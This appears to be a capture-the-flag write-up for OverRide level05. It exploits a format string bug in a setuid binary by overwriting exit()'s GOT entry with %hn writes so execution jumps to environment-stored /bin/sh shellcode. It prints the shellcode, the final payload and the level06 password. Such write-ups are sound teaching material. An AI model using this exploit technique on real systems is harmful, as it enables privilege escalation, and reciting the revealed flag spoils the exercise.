Level05 protections:
```Shell
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

Level05 rights:
```Shell
level05@OverRide:~$ ls -la level05 
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

Testing the binary:
```Shell
level05@OverRide:~$ ./level05
COUCOU
coucou
```

Decompiling with Hex-Rays on https://dogbolt.org/ shows three things:
- the program converts input from uppercase to lowercase
- a format string attack is possible because of an unsafe `printf()` call
- the program ends with a call to `exit()`.

Our solution is to store a shellcode inside an environment variable. Then, we will overwrite `exit()` with the address of a NOP instruction that will lead to our shellcode. If we don't export our shellcode in an environment variable, any values corresponding to an uppercase letter in ASCII will be modified by the program. 
To rewrite the `exit()` call, we will use the `%n` specifier. We will send the address of the NOP instruction as a decimal number and store it inside the `exit()` call.

First, let's get the addres of `exit()`:
```Shell
level05@OverRide:~$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
[...]
080497e0 R_386_JUMP_SLOT   exit
[...]
```
Here it is: `\x08\x04\x97\xe0`.

Then, let's export our shellcode:
```Shell
export SHELLCODE=`python -c 'print("\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'`
```

Let's retrieve the address of our environment variable:
```Shell
(gdb) x/s *(char **)environ
0xffffd872:      "SHELLCODE=[...]
```

The address is 0xffffd872 but we will add 12 to be sure we get the address of a NOP instruction (we put 100 of them!): this gives us `0xffffd87e`.
But we are faced with a huge issue.
Writing the address in one go is impossible: in decimal, this is 4294957182 and it exceeds the capacity of a `printf()` call. 
We are forced to store the first two bytes and the last two bytes into two `short int`, aka `%h`.

Here is the address, divided into two, and converted to decimal:
ffff = 65535 / d87e = 55422.
Because of this, the address of `exit()` must also be in two parts:
`\x08\x04\x97\xe0` will store the first part and `\x08\x04\x97\xe2` (the start + 2 bytes) will store the second part.

Since we're in little endian, `d87e` will be the first part. We subtract 8 because of the 8 bytes of the address of `exit()` and we get `55414` as a final value.
`ffff` will be the second part. We subtract 8 because of `exit()`, but also `55414`, so we get `10113` as a final value.
We will place each value next to each other on the stack.
Let's find the index of our buffer on the stack:
```Shell
level05@OverRide:~$ ./level05
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0x64 0xf7fcfac0 0xf7ec3add 0xffffd66f 0xffffd66e (nil) 0xffffffff 0xffffd6f4 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```
`0x61616161`(aaaa) is found at index 10, so they will be placed at index 10 and index 11, respectively.

So our final payload will consist of:
[first two bytes of the address of `exit()`] + [last two bytes of the address of `exit()`] (reversed to little endian)
and then
%[last bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn + %[first bytes of the address of our shellcode in decimal]d + %[the index on the stack]$hn:
```Shell
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55414d" + "%10$hn" + "%10113d" + "%11$hn")' > /tmp/payload06
```

And the result is:
```Shell
level05@OverRide: cat /tmp/payload06 - | ./level05
[...]
        -134415680
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```